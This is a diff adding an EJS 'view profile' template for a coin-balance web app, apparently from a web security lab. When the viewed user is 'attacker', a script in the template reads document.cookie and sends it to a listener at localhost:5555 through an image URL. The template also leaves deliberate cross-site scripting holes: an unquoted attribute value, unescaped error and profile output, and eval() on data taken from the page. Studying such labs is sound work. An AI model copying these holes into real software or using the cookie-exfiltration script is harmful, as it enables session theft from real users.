@@ -1,0 +1,44 @@
+<h3>View profile</h3>
+
+<form class="pure-form" action="/profile" method="get">
+    <input type="text" name="username" placeholder="username" value=<%= result.username %> >
+    <input class="pure-button" type="submit" value="Show">
+</form>
+
+<% if(errorMsg) { %>
+  <p class='error'> <%- errorMsg %> </p>
+<% } %>
+
+<% if(loggedIn) { %>
+    <% if(result.username == 'attacker') { %>
+      <img id='attack' src='http://localhost:5555'>
+      <script>
+        var cookie = document.cookie;
+        console.log(cookie);
+        document.getElementById('attack').src = 'http://localhost:5555?cookie=' + document.cookie;
+      </script>
+    <% } %>
+    <% if(result.username == account.username) { %>
+        <h3>Your profile</h3>
+    <% } else { %>
+        <h3><%= result.username %>'s profile</h3>
+    <% } %>
+
+    <p id="volCoin_display">0 volCoins</p>
+
+    <% if (result.username && result.profile) { %>
+        <div id="profile"><%- result.profile %></div>
+    <% } %>
+
+    <span id="volCoin_count" class="<%= result.volCoins %>" />
+    <script type="text/javascript">
+      var total = eval(document.getElementById('volCoin_count').className);
+      function showvolCoins(volCoins) {
+        document.getElementById("volCoin_display").innerHTML = volCoins + " volCoins";
+        if (volCoins < total) {
+          setTimeout("showvolCoins(" + (volCoins + 1) + ")", 5);
+        }
+      }
+      if (total > 0) showvolCoins(0);  // count up to total
+    </script>
+<% } %>
